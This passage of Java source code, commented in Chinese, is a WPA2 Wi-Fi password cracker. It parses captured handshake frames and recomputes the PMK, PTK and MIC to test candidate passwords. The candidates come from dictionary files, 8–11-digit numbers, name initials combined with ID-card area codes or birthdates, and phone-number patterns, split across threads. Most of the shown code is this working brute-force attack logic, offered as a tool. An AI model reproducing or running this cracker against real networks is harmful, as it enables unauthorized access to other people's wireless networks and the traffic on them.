			byte[] min_mac_bytes = Min_Byte(sta_mac_bytes, ap_mac_bytes);
			byte[] max_mac_bytes = Max_Byte(sta_mac_bytes, ap_mac_bytes);
			byte[] min_nonce_bytes = Min_Byte(ap_nonce_bytes, sta_nonce_bytes);
			byte[] max_nonce_bytes = Max_Byte(ap_nonce_bytes, sta_nonce_bytes);

//			System.out.println();
//			String ssid_name = String.valueOf(getChars((ssid_bytes)));
//			System.out.println("         ssid_name.length=" + ssid_name.length() + "             ssid_bytes  = "+ Arrays.toString(ssid_bytes)+"  ssid_name=" + ssid_name );
//			System.out.println("      ap_mac_bytes.length=" + ap_mac_bytes.length+ "           ap_mac_bytes  = " + Arrays.toString(ap_mac_bytes));
//			System.out.println("     sta_mac_bytes.length=" + sta_mac_bytes.length+ "          sta_mac_bytes  = "+ Arrays.toString(sta_mac_bytes));
//			System.out.println("    ap_nonce_bytes.length=" + ap_nonce_bytes.length+ "        ap_nonce_bytes  = "+ Arrays.toString(ap_nonce_bytes));
//			System.out.println("   sta_nonce_bytes.length=" + sta_nonce_bytes.length+ "       sta_nonce_bytes  = "+ Arrays.toString(sta_nonce_bytes));
//			System.out.println("  step2_data_bytes.length=" + step2_data_bytes.length+ "     step2_data_bytes  = "+ Arrays.toString(step2_data_bytes));
//			System.out.println("         mic_bytes.length=" + mic_bytes.length+ "             mic_bytes  = "+ Arrays.toString(mic_bytes));
//
//			System.out.println();

			if (pwdList.size() > 0) {
				System.out.println("thread_id=" + thread_id + " 使用历史明文密码破解: 明文数量=" + pwdList.size()+"  明文文件:" +Rule_53_wp2_password_dictionary_file.getAbsolutePath());
			}


			long begin_time_long = System.currentTimeMillis();
			long temp_time_long = System.currentTimeMillis();
			int print_inteval_time = 1000;
			int default_begin = 0 ;
			int default_end = 0 ;


			for (int i = 0; i < pwdList.size(); i++) {
				String password_temp_item = pwdList.get(i);
				begin_wifi_crack_inner_withstr(password_temp_item, ssid_bytes, ap_mac_bytes, sta_mac_bytes,
						ap_nonce_bytes, sta_nonce_bytes, step2_data_bytes, mic_bytes);
				if (success_crack_flag) {
					return;
				}

				if(i != 0 &&  (i % print_inteval_time) == 0) {



					long cur_time_long = System.currentTimeMillis();
					long time_distance_long = cur_time_long - temp_time_long;
					temp_time_long = cur_time_long;
					long time_alltake_long = cur_time_long - begin_time_long;


					double percent = ((double) (i - default_begin) / (default_end - default_begin)) * 100;

					password_retry_calcul_percent = ((double) i / pwdList.size()) * 100;

//					System.out.println("thread_id=" + thread_id + " all_thread=" + thread_count + "  " + numberCount
//							+ "位数字 " + "cur_number_str=" + get_match_numcount_digital_str + "  else_num="
//							+ (default_end - i) + " persent=" + String.format("%.4f", percent) + "%"
//							+ "  begin_default=" + default_begin + "   end_default=" + default_end + " 总尝试密码"
//							+ password_retry_calcul_count + "个  " + numberCount + "进制进度"
//							+ String.format("%.4f", password_retry_calcul_percent) + "%  " + print_inteval_time
//							+ "次密码尝试花销:" + (time_distance_long / 1000) + "秒 " + numberCount + "位密码破解以花销:"
//							+ (time_alltake_long / 1000) + "秒 ");

					System.out.println("thread_id=[" + thread_id + "][" + thread_count + "] 进度="+String.format("%.4f", password_retry_calcul_percent) + "% "+
							" 明文索引["+i+"]_sub["+pwdList.size()+"]_all["+wp2_password_dictionary_alllist.size()+"]="+password_temp_item
							+"  明文来自于"+Rule_53_wp2_password_dictionary_file.getAbsolutePath()+" "+
							print_inteval_time+ "次密码尝试花销:" + (time_distance_long / 1000) + "秒 " +
							i+ "位密码破解以花销:" + (time_alltake_long / 1000) + "秒 " +


							"");



				}

			}

			if (success_crack_flag) { // 历史明文密码 破解了 wifi 那么 直接返回
				return;
			}

//			public  static int  namechar_2_3_areacode6 = 1; // 名字+6位areacode   一千万数据
//			public  static int  digital_8_number = 2;  // 纯8位数字  一亿数据
//			public  static int  namechar_2_3_birthday6 = 3;  // 姓氏+ 生日日期  1千两百万 + 3亿
//			public  static int  digital_9_number = 4;  // 纯9位数字  十亿数据
//			public  static int  tel_11_number = 5;  // 电话号码  40*  四十亿

			char[] crack_execute_order_chararr = Rule_53_Crack_Order_Default.toCharArray();
			if(crack_execute_order_chararr == null || crack_execute_order_chararr.length <= 0 ) {
				System.out.println("当前执行顺序为空! crack_execute_order_chararr = " + Arrays.toString(crack_execute_order_chararr));
				return;
			}

			for (int i = 0; i < crack_execute_order_chararr.length; i++) {
				String curCrackOrder_Str = crack_execute_order_chararr[i]+"";
				switch(curCrackOrder_Str) {
					case "1":
						System.out.println("使用 thread_id["+thread_id+"]["+thread_count+"] 规则【"+curCrackOrder_Str+"】 使用 名字+6位areacode 进行破解!! ");

						// 使用 名字+6位areacode 进行破解
						begin_name_areacode_wifi_crack(ssid_bytes, ap_mac_bytes, sta_mac_bytes, ap_nonce_bytes, sta_nonce_bytes,
								step2_data_bytes, mic_bytes);
						if (success_crack_flag) { // 历史明文密码 破解了 wifi 那么 直接返回
							return;
						}

						break;

					case "2":

						System.out.println("使用 thread_id["+thread_id+"]["+thread_count+"] 规则【"+curCrackOrder_Str+"】 使用 8 位 数字 密码 进行破解!! ");

						// 使用 8 位 数字 密码 进行破解 Begin
						System.out.println("══════════════════════ thread[" + thread_id + "][" + thread_count
								+ "] 使用 8 位 数字 密码 进行破解 " + " pwd_8_begin_long=" + pwd_8_begin_long + "  pwd_8_end_long="
								+ pwd_8_end_long + " ══════════════════════ ");
						begin_digital_wifi_crack(8, ssid_bytes, ap_mac_bytes, sta_mac_bytes, ap_nonce_bytes, sta_nonce_bytes,
								step2_data_bytes, mic_bytes);
						if (success_crack_flag) { // 历史明文密码 破解了 wifi 那么 直接返回
							return;
						}


						break;


					case "3":
						System.out.println("使用 thread_id["+thread_id+"]["+thread_count+"] 规则【"+curCrackOrder_Str+"】 使用 名字+生日 姓氏+生日 进行 破解!! ");

						// 使用 名字+生日 姓氏+生日 进行 破解
						begin_name_birthday_wifi_crack(ssid_bytes, ap_mac_bytes, sta_mac_bytes, ap_nonce_bytes, sta_nonce_bytes,
								step2_data_bytes, mic_bytes);
						if (success_crack_flag) { // 历史明文密码 破解了 wifi 那么 直接返回
							return;
						}


						break;

					case "4":
						// 使用 9 位 数字 密码 进行破解 Begin
						System.out.println("使用 thread_id["+thread_id+"]["+thread_count+"] 规则【"+curCrackOrder_Str+"】 使用 9 位 数字 密码 进行破解!! ");

						System.out.println("══════════════════════thread[" + thread_id + "][" + thread_count
								+ "] 使用 9 位 数字 密码 进行破解 " + " pwd_9_begin_long=" + pwd_9_begin_long + "  pwd_9_end_long="
								+ pwd_9_end_long + " ══════════════════════ ");
						begin_digital_wifi_crack(9, ssid_bytes, ap_mac_bytes, sta_mac_bytes, ap_nonce_bytes, sta_nonce_bytes,
								step2_data_bytes, mic_bytes);
						if (success_crack_flag) { // 历史明文密码 破解了 wifi 那么 直接返回
							return;
						}
						break;


					case "5":
						System.out.println("使用 thread_id["+thread_id+"]["+thread_count+"] 规则【"+curCrackOrder_Str+"】 使用11 位 电话 号码 破解!! ");

						// 使用11 位 电话 号码 破解 40 * 10000 * 10000
						System.out.println("══════════════════════thread[" + thread_id + "][" + thread_count
								+ "] 使用 9 位 数字 密码 进行破解 " + " pwd_9_begin_long=" + pwd_9_begin_long + "  pwd_9_end_long="
								+ pwd_9_end_long + " ══════════════════════ ");
						begin_11_telcode_wifi_crack(ssid_bytes, ap_mac_bytes, sta_mac_bytes, ap_nonce_bytes, sta_nonce_bytes,
								step2_data_bytes, mic_bytes);
						if (success_crack_flag) { // 历史明文密码 破解了 wifi 那么 直接返回
							return;
						}

						break;

					default:
						System.out.println("当前 curCrackOrder_Str ="+ curCrackOrder_Str +" 没有匹配到破解逻辑");
						break;

				}


			}


			// 前缀2字母 + 使用 6 位 数字 密码 进行破解 Begin aa11111 放弃
//			System.out.println("══════════════════════thread["+thread_id+"]["+thread_count+"] 使用 9 位 数字 密码 进行破解 "+" pwd_9_begin_long="+pwd_9_begin_long+"  pwd_9_end_long="+pwd_9_end_long+" ══════════════════════ ");
//			begin_xchars_xdigital_wifi_crack(2,6,ssid_bytes,ap_mac_bytes,sta_mac_bytes,ap_nonce_bytes,sta_nonce_bytes,step2_data_bytes,mic_bytes);
//			if(success_crack_flag) {  // 历史明文密码 破解了 wifi 那么 直接返回
//				return;
//			}

			// 前缀2数字 + 使用 6 位 字母 密码 进行破解 Begin 11aaaaa 放弃
//			System.out.println("══════════════════════thread["+thread_id+"]["+thread_count+"] 使用 9 位 数字 密码 进行破解 "+" pwd_9_begin_long="+pwd_9_begin_long+"  pwd_9_end_long="+pwd_9_end_long+" ══════════════════════ ");
//			begin_xdigital_xchars_wifi_crack(2,6,ssid_bytes,ap_mac_bytes,sta_mac_bytes,ap_nonce_bytes,sta_nonce_bytes,step2_data_bytes,mic_bytes);
//			if(success_crack_flag) {  // 历史明文密码 破解了 wifi 那么 直接返回
//				return;
//			}

			System.out.println("尼玛 10位数值是 0 到 9999999999  百亿个数字   不干了!!   Fuck 罢工!  ");

		}

		//

		void begin_name_areacode_wifi_crack(byte[] ssid_bytes, byte[] ap_mac_bytes, byte[] sta_mac_bytes,
											byte[] ap_nonce_bytes, byte[] sta_nonce_bytes, byte[] step2_data_bytes, byte[] mic_bytes) {

			// a19490101

			// 每个线程都是 一样的 nima 怎么 依据 thread_id 和 thread_count 区分开来
			// 对 area_policy_code_list 下手

			// aa19490101




			for (int i = 0; i < little_char_arr_A.length; i++) {
				String char_A_str = little_char_arr_A[i];
				for (int j = 0; j < little_char_arr_B.length; j++) {
					String char_B_str = little_char_arr_B[j];

					for (int k = 0; k < area_policy_code_sublist.size(); k++) {
						String area_code_item = area_policy_code_sublist.get(k);
						String password_temp = (char_A_str + char_B_str + area_code_item).trim();

						begin_wifi_crack_inner_withstr(password_temp, ssid_bytes, ap_mac_bytes, sta_mac_bytes,
								ap_nonce_bytes, sta_nonce_bytes, step2_data_bytes, mic_bytes);
						if (success_crack_flag) {
							return;
						}

					}
					System.out.println("thread_id=" + thread_id + "  开始测试 " + char_A_str + char_B_str
							+ "+6位 身份证前6位的 验证测试 ! area_policy_code_list.size()=" + area_policy_code_sublist.size());

				}
			}

			// aaa362323

			for (int i = 0; i < little_char_arr_A.length; i++) {
				String char_A_str = little_char_arr_A[i];
				for (int j = 0; j < little_char_arr_B.length; j++) {
					String char_B_str = little_char_arr_B[j];
					for (int k = 0; k < little_char_arr_C.length; k++) {
						String char_C_str = little_char_arr_C[k];

						for (int z = 0; z < area_policy_code_sublist.size(); z++) {
							String area_code_item = area_policy_code_sublist.get(z);
							String password_temp = (char_A_str + char_B_str + char_C_str + area_code_item).trim();

							begin_wifi_crack_inner_withstr(password_temp, ssid_bytes, ap_mac_bytes, sta_mac_bytes,
									ap_nonce_bytes, sta_nonce_bytes, step2_data_bytes, mic_bytes);
							if (success_crack_flag) {
								return;
							}

						}

						System.out.println("thread_id=" + thread_id + "  开始测试 " + char_A_str + char_B_str + char_C_str
								+ "+6位 身份证前6位的 验证测试 ! area_policy_code_list.size()=" + area_policy_code_sublist.size());

					}

				}
			}

		}

		// 使用 11 位 电话 号码 破解
//     begin_11_telcode_wifi_crack

		void begin_11_telcode_wifi_crack(byte[] ssid_bytes, byte[] ap_mac_bytes, byte[] sta_mac_bytes,
										 byte[] ap_nonce_bytes, byte[] sta_nonce_bytes, byte[] step2_data_bytes, byte[] mic_bytes) {

			for (int i = 0; i < tel_code_pre5_sublist.size(); i++) {
				String pre_5_telcode = tel_code_pre5_sublist.get(i);

				for (int j = 0; j < 1000000; j++) {
					String end_6_telcode_str = getMatchLength_NumStr(j, 6);

					String password_temp = pre_5_telcode + end_6_telcode_str;

					begin_name_birthday_wifi_crack(password_temp, year_search_begin, year_search_end, ssid_bytes,
							ap_mac_bytes, sta_mac_bytes, ap_nonce_bytes, sta_nonce_bytes, step2_data_bytes, mic_bytes);
					if (success_crack_flag) {
						return;
					}

					if (j % 1000 == 0) {
						System.out.println("thread[" + thread_id + "][" + thread_count + "] 执行11位电话号码 破解尝试  当前测试号码:"
								+ password_temp + "   当前线程的号码位置 tel_code[" + i + "]" + "[" + tel_code_pre5_sublist.size()
								+ "]_[" + j + "][10000]");
					}

				}

			}

		}

		// 使用中国 名字 + 生日日期进行 破解
		// 25*25*25*365 = 5703125 依据 thread_count 动态指定 year_search_begin year_search_end
		void begin_name_birthday_wifi_crack(byte[] ssid_bytes, byte[] ap_mac_bytes, byte[] sta_mac_bytes,
											byte[] ap_nonce_bytes, byte[] sta_nonce_bytes, byte[] step2_data_bytes, byte[] mic_bytes) {

			// a19490101
			for (int i = 0; i < little_char_arr_A.length; i++) {
				String char_A_str = little_char_arr_A[i];
				String password_temp = char_A_str;
				begin_name_birthday_wifi_crack(password_temp, year_search_begin, year_search_end, ssid_bytes,
						ap_mac_bytes, sta_mac_bytes, ap_nonce_bytes, sta_nonce_bytes, step2_data_bytes, mic_bytes);
				if (success_crack_flag) {
					return;
				}
			}

			// aa19490101
			for (int i = 0; i < little_char_arr_A.length; i++) {
				String char_A_str = little_char_arr_A[i];
				for (int j = 0; j < little_char_arr_B.length; j++) {
					String char_B_str = little_char_arr_B[j];
					String password_temp = char_A_str + char_B_str;
					begin_name_birthday_wifi_crack(password_temp, year_search_begin, year_search_end, ssid_bytes,
							ap_mac_bytes, sta_mac_bytes, ap_nonce_bytes, sta_nonce_bytes, step2_data_bytes, mic_bytes);
					if (success_crack_flag) {
						return;
					}

				}
			}

			// aaa19490101

			for (int i = 0; i < little_char_arr_A.length; i++) {
				String char_A_str = little_char_arr_A[i];
				for (int j = 0; j < little_char_arr_B.length; j++) {
					String char_B_str = little_char_arr_B[j];
					for (int k = 0; k < little_char_arr_C.length; k++) {
						String char_C_str = little_char_arr_C[k];
						String password_temp = char_A_str + char_B_str + char_C_str;
						begin_name_birthday_wifi_crack(password_temp, year_search_begin, year_search_end, ssid_bytes,
								ap_mac_bytes, sta_mac_bytes, ap_nonce_bytes, sta_nonce_bytes, step2_data_bytes,
								mic_bytes);
						if (success_crack_flag) {
							return;
						}

					}

				}
			}

		}

		void begin_name_birthday_wifi_crack(String preName, int beginYear, int endYear, byte[] ssid_bytes,
											byte[] ap_mac_bytes, byte[] sta_mac_bytes, byte[] ap_nonce_bytes, byte[] sta_nonce_bytes,
											byte[] step2_data_bytes, byte[] mic_bytes) {

			long test_count = 0;
			for (int i = beginYear; i <= endYear; i++) {

				int curYear = i;

				for (int j = 1; j <= 12; j++) {
					int curMonth = j;
					for (int k = 1; k <= 31; k++) {
						int curDay = k;
						String year_month_day_8str = calcul_year_month_day_8length(curYear, curMonth, curDay);
						String password_test = preName + year_month_day_8str;

						begin_wifi_crack_inner_withstr(password_test, ssid_bytes, ap_mac_bytes, sta_mac_bytes,
								ap_nonce_bytes, sta_nonce_bytes, step2_data_bytes, mic_bytes);
						if (success_crack_flag) {
							return;
						}

					}

				}
				System.out.println(
						"执行从 " + preName + curYear + "0101" + "------" + preName + curYear + "1231" + " 的密码测试!! ");

			}

		}

		String calcul_year_month_day_8length(int year, int month, int day) {
			String year_str = year + "";
			String month_str = month + "";
			String day_str = day + "";
			if (day < 10) {
				day_str = "0" + day;
			}

			if (month < 10) {
				month_str = "0" + month;
			}
			return year_str + month_str + day_str;
		}

		// 使用 前缀字母 后缀带数字的 密码 放弃 类似 zrankgroup_E4.bat
		// 1234567890abcdefghijklmnopqrstuvwxyz 爆炸了
		//
		void begin_xchars_xdigital_wifi_crack(int charCount, int numberCount, byte[] ssid_bytes, byte[] ap_mac_bytes,
											  byte[] sta_mac_bytes, byte[] ap_nonce_bytes, byte[] sta_nonce_bytes, byte[] step2_data_bytes,
											  byte[] mic_bytes) {

			// 0 , 0 ,0 , 0 , 0 ,0
			// 0 , 0 ,0 , 0 , 0 , 1
			// 32 , 32 ,32 ,32 ,32 ,32
			// 1073741823 十亿个 索引 放弃了 xxx
			ArrayList<ArrayList<Integer>> charIndexList_List = new ArrayList<ArrayList<Integer>>();

			long cur_char_max_number = (long) Math.pow(all_char_list.size(), (double) charCount) - 1;

//       多维for循环
//       var loop_index = 0;
// 		 for(a:A;b:B;c:C;d:D;e:E;f:F;g:G){
//            var item =a+b+c+d+e+f+g;
//            loop_index++;
//            print("loop_index="+loop_index+"  item="+item)
// 	        }

			ArrayList<ArrayList<String>> charList_List = new ArrayList<ArrayList<String>>();

			for (int i = 0; i < charCount; i++) {

				ArrayList<String> temp_char_list = new ArrayList<String>();
				temp_char_list.addAll(all_char_list);

				charList_List.add(temp_char_list);

			}

			long cur_max_number = (long) Math.pow(10d, (double) numberCount) - 1;
			for (int i = 0; i < charList_List.size(); i++) {
				ArrayList<String> cur_char_list = charList_List.get(i);

				for (int j = 0; j < cur_char_list.size(); j++) {

					String cur_char = cur_char_list.get(j);
				}

			}

		}

		// 使用 前缀字母 后缀带数字的 密码
		void begin_xdigital_xchars_wifi_crack(int numberCount, int charCount, byte[] ssid_bytes, byte[] ap_mac_bytes,
											  byte[] sta_mac_bytes, byte[] ap_nonce_bytes, byte[] sta_nonce_bytes, byte[] step2_data_bytes,
											  byte[] mic_bytes) {

		}

		// 使用 纯数字 进行 破解 8 位 9位 10位 11位
		void begin_digital_wifi_crack(int numberCount, byte[] ssid_bytes, byte[] ap_mac_bytes, byte[] sta_mac_bytes,
									  byte[] ap_nonce_bytes, byte[] sta_nonce_bytes, byte[] step2_data_bytes, byte[] mic_bytes) {
			long default_begin = pwd_8_begin_long;
			long default_end = pwd_8_end_long;
			MAX_CUR_COUNT = MAX_8_COUNT;
			if (numberCount == 9) {
				default_begin = pwd_9_begin_long;
				default_end = pwd_9_end_long;
				MAX_CUR_COUNT = MAX_9_COUNT;
			}

			if (numberCount == 10) {
				default_begin = pwd_10_begin_long;
				default_end = pwd_10_end_long;
				MAX_CUR_COUNT = MAX_10_COUNT;
			}

			if (numberCount == 11) {
				default_begin = pwd_11_begin_long;
				default_end = pwd_11_end_long;
				MAX_CUR_COUNT = MAX_11_COUNT;
			}

			// 8位时 10个线程 每个线程 1千万个数字

			// 8 位时
			// 0 转为 00000000
			// 123 转为 00000123

			// 9 位时
			// 0 转为 000000000
			// 123 转为 000000123
			long begin_time_long = System.currentTimeMillis();
			long temp_time_long = System.currentTimeMillis();
			int print_inteval_time = 1000;

			for (long i = default_begin; i <= default_end; i++) {
				String get_match_numcount_digital_str = getMatchLength_NumStr(i, numberCount);

				begin_wifi_crack_inner_withstr(get_match_numcount_digital_str, ssid_bytes, ap_mac_bytes, sta_mac_bytes,
						ap_nonce_bytes, sta_nonce_bytes, step2_data_bytes, mic_bytes);
				if (success_crack_flag) {
					return;
				}
				if (i % print_inteval_time == 0 && i != default_begin) {
					long cur_time_long = System.currentTimeMillis();
					long time_distance_long = cur_time_long - temp_time_long;
					temp_time_long = cur_time_long;
					long time_alltake_long = cur_time_long - begin_time_long;

					password_retry_calcul_count += print_inteval_time;

					double percent = ((double) (i - default_begin) / (default_end - default_begin)) * 100;

					password_retry_calcul_percent = ((double) password_retry_calcul_count / MAX_CUR_COUNT) * 100;

					System.out.println("thread_id=" + thread_id + " all_thread=" + thread_count + "  " + numberCount
							+ "位数字 " + "cur_number_str=" + get_match_numcount_digital_str + "  else_num="
							+ (default_end - i) + " persent=" + String.format("%.4f", percent) + "%"
							+ "  begin_default=" + default_begin + "   end_default=" + default_end + " 总尝试密码"
							+ password_retry_calcul_count + "个  " + numberCount + "进制进度"
							+ String.format("%.4f", password_retry_calcul_percent) + "%  " + print_inteval_time
							+ "次密码尝试花销:" + (time_distance_long / 1000) + "秒 " + numberCount + "位密码破解以花销:"
							+ (time_alltake_long / 1000) + "秒 ");
				}
			}
			System.out.println(numberCount + "位数字类型遍历完成  无法找到对应的密码!");
			password_retry_calcul_count = 0; // 当前 已经 进行过 计算的 数据的个数
			password_retry_calcul_percent = 0; // 当前 总的位数的 进度

		}

		String getMatchLength_NumStr(long num, int length) {
			String numStr = "" + num;
			String paddingStr = "";
			int numSrt_length = numStr.length();

			int padding_zero_count = length - numSrt_length;

			if (padding_zero_count > 0) {

				paddingStr = getPadding_WithZero_LongString(padding_zero_count, "0");

			}

			return paddingStr + numStr;
		}

		private boolean begin_wifi_crack_inner_withstr(String pwd_str, byte[] ssid_bytes, byte[] ap_mac_bytes,
													   byte[] sta_mac_bytes, byte[] ap_nonce_bytes, byte[] sta_nonce_bytes, byte[] step2_data_bytes,
													   byte[] mic_bytes) {
			boolean is_success_flag = false;

			String password_temp_item = pwd_str;

			try {

				byte[] ap_sta_mac_nonce_100bytes = byteConcat_6to1("Pairwise key expansion\0".getBytes("UTF8"),
						Min_Byte(sta_mac_bytes, ap_mac_bytes), Max_Byte(ap_mac_bytes, sta_mac_bytes),
						Min_Byte(sta_nonce_bytes, ap_nonce_bytes), Max_Byte(ap_nonce_bytes, sta_nonce_bytes),
						"\0".getBytes("UTF8"));

				byte[] pmk_data_32bytes = pbkdf2_sha1(password_temp_item, ssid_bytes, 4096, 32);

				byte[] ptk_data_16bytes = hmac_sha1(ap_sta_mac_nonce_100bytes, pmk_data_32bytes, 16);

				int step2_data_bytes_length = step2_data_bytes.length;

				byte[] step2_data_bytes_fixed = Arrays.copyOf(step2_data_bytes, step2_data_bytes_length);
				for (int j = 81; j < 97; j++) {
					step2_data_bytes_fixed[j] = (byte) 0x00;
				}

				byte[] mic_data_bytes = hmac_sha1(step2_data_bytes_fixed, ptk_data_16bytes, 16);

				if (Arrays.equals(mic_data_bytes, mic_bytes)) {
					success_crack_tip = "\n恭喜成功破解\nthread[" + thread_id + "][" + thread_count + "]  使用明文密码 _______" + password_temp_item
							+ "_______ 暴力破解 Wifi网络(_______" + String.valueOf(getChars((ssid_bytes))) + "_______) 匹配成功!"+"\n"
							+zbinPath+File.separator+"I9_wpa2_crack_rule53_pwd_dictionary.txt    该文件包含用户自定义明文密码";

					System.out.println("thread[" + thread_id + "][" + thread_count + "]  使用明文密码 " + password_temp_item
							+ " 暴力破解 Wifi网络(" + String.valueOf(getChars((ssid_bytes))) + ") 匹配成功!");
					is_success_flag = true;
					success_crack_flag = true;

				}
			} catch (Exception e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}

			return is_success_flag;

		}

	}

	class Wifi_Frame_Struct_00000001 extends Wifi_Frame_Base_Struct {

		Wifi_Frame_Struct_00000001(byte[] block_type_bytes, byte[] block_head_length_bytes, byte[] all_frame_bytes,
								   int beginInFile, int endInFile) {
			super(block_type_bytes, block_head_length_bytes, all_frame_bytes, beginInFile, endInFile);
			// TODO Auto-generated constructor stub
		}

		Wifi_Frame_Struct_00000001() {

		}

	}

	class Wifi_Frame_Struct_00000005 extends Wifi_Frame_Base_Struct {

		Wifi_Frame_Struct_00000005(byte[] block_type_bytes, byte[] block_head_length_bytes, byte[] all_frame_bytes,
								   int beginInFile, int endInFile) {
			super(block_type_bytes, block_head_length_bytes, all_frame_bytes, beginInFile, endInFile);
			// TODO Auto-generated constructor stub
		}

		Wifi_Frame_Struct_00000005() {

		}

		void parse_wifi_frame(byte[] all_frame) {

		}

	}

//    1                   2                   3
//0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
//+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
//0 |                    Block Type = 0x00000006                    |
//+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
//4 |                      Block Total Length                       |
//+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
//8 |                         Interface ID                          |
//+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
//12 |                        Timestamp (High)                       |
//+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
//16 |                        Timestamp (Low)                        |
//+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
//20 |                    Captured Packet Length                     |
//+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
//24 |                    Original Packet Length                     |
//+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
//28 /                                                               /
///                          Packet Data                          /
///              variable length, padded to 32 bits               /
///                                                               /
//+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
///                                                               /
///                      Options (variable)                       /
///                                                               /
//+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
//|                      Block Total Length                       |
//+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+

	class Wifi_Frame_Struct_00000006 extends Wifi_Frame_Base_Struct {

		// ════════════════ Block Format Begin ════════════════
		byte[] Interface_ID_4bytes;
		byte[] Timestamp_High_4bytes;
		byte[] Timestamp_Low_4bytes;
		byte[] Captured_Packet_Length_4bytes;
		byte[] Original_Packet_Length_4bytes;
		int Captured_Packet_Avaliable_Length; // 有效字节占用
		int Original_Packet_Avaliable_Length; // 有效字节占用
		int Captured_Packet_Real_Length; // 有效字节占用 32位对齐 后的实际占用
		int Original_Packet_Real_Length;
		byte[] Packet_Data_bytes; // 内部协议的解析 包数据 看得见的数据包的部分
		//		int Packet_Data_Visibal_Length ;   // wireshark 打开 可见帧数据长度 等于 Packet_Data_bytes 的长度
		String timestamp_str; // 时间戳代表的内容
		// ════════════════ Block Format End ════════════════

		// ════════════════ IE80211_Format Begin ════════════════

		byte wifi_type_subtype_1byte; // wifi 帧的 type 管理帧 数据帧 控制帧 和 subtype 各种类型
		int wifi_type_int; // 主类型
		int wifi_subtype_int; // 子类型

		byte wifi_control_flag_1byte; //

		boolean wifi_is_receive_farme; // 是否是接收帧
		boolean wifi_is_protected; // 是否是加密的 wifi_control_flag_1byte的 0x40 为 是否为 1 决定

		byte[] wifi_during_2bytes;

		// 只有三个是 表现在 字节中 剩下的那个 默认 为
		byte[] wifi_ra_6bytes; // 接收地址
		byte[] wifi_ta_6bytes; // 传输地址
		byte[] wifi_da_6bytes; // 目的 地址
		byte[] wifi_sa_6bytes; // 原 地址

		byte[] wifi_bssid_6bytes; // 原 地址

		byte[] wifi_high12bit_SequenceNumber_low4bit_FragmentNumber_2bytes;
		byte[] wifi_qos_control_2bytes;
		byte[] wifi_ccmp_paramters_8bytes;

		byte[] wifi_logical_link_conteolflag_8bytes;
		byte[] wifi_logical_link_type_2bytes;
		String wifi_logical_link_type_2bytes_hexstr;

		byte[] wifi_qos_data_bytes; // Qos-Data 携带的数据类型

		// eapol-接受的帧有 发送的帧 没有 frame_check_sequeue 【路由器发送的帧 都有 frame_check_sequeue ？ 】
		byte[] wifi_qosdata_frame_check_sequeue_4bytes; // Qos-data 数据的最后四个 校验码 注意 EAP-类型 没有该字段

//   8 比特位 的 Flag
//      .... ..10 = DS status: Frame from DS to a STA via AP(To DS: 0 From DS: 1) (0x2)    对于STA  0:发送帧   1:接收帧
//    	.... .0.. = More Fragments: This is the last fragment     该帧是否还有分包数据
//    	.... 0... = Retry: Frame is not being retransmitted       重传
//    	...0 .... = PWR MGT: STA will stay up                     省电管理
//    	..0. .... = More Data: No data buffered                   有数据缓存吗
//    	.0.. .... = Protected flag: Data is not protected         是否是加密数据
//    	0... .... = +HTC/Order flag: Not strictly ordered
		// ════════════════ IE80211_Format Format End ════════════════

		byte[] wifi_8021x_auth_version_1byte; // Version: 802.1X-2001 (1)
		int wifi_8021x_auth_version_int;
		byte[] wifi_8021x_auth_type_1byte; // eapol==3 eap=0
		int wifi_8021x_auth_type_int;
		byte[] wifi_8021x_auth_length_2byte;
		int wifi_8021x_auth_length_int;
		byte[] wifi_eapol_auth_data_bytes; // eapol 的 认证的数据 集合

		byte[] wifi_eapol_all_data_bytes; // eapol 的 认证的数据 集合

		byte[] eap_key_desc_1bytes;
		byte[] eap_key_info_2bytes;
		byte[] eap_key_length_2bytes; // 区别于 eap_key_data_length_2bytes

		byte[] eap_replay_counter_8bytes;

		byte[] eap_wpa_key_nonce_32bytes;

		byte[] eap_key_iv_16bytes;

		byte[] eap_key_rsc_8bytes;
		byte[] eap_key_id_8bytes;

		byte[] eap_key_mic_16bytes;

		byte[] eap_key_data_length_2bytes;
		int eap_key_data_length_int;

		byte[] eap_key_data_bytes;

//        eap_key_desc_1bytes

		// ══════════ beacon_frame_begin ═══════════════

		byte[] wifi_80211_wireless_management_beacon_bytes; // 802.11 byte 管理帧数据
		byte[] wifi_80211_wireless_management_beacon_ssid_bytes; // ssid 的 热点名称的 字节数组
		String ssid_hexstr; // 热点名称对应的字符串的十六进制形式
		String ssid_name; // 人类可读的热点

		byte[] wifi_80211_wireless_management_beacon_channel_bytes; // 当前热点频道的 字节数组
		int wifi_80211_wireless_management_beacon_channel_id; // 频道id
		int wifi_80211_wireless_management_beacon_channel_hz; // id 对应的 赫兹频道

		// ══════════ beacon_frame_end ═══════════════

		// ════════════════ Radiotap Format Begin ════════════════
		ArrayList<ArrayList<Integer>> MultiPresent_IntList_List;

		byte[] get_wifi_bssid_Bytes() {
			return wifi_bssid_6bytes;
		}

		byte[] get_wifi_ssid_Bytes() {
			return wifi_80211_wireless_management_beacon_ssid_bytes;
		}

		String get_wifi_ssid() {
			return ssid_name;
		}

		@Override
		public String toString() {
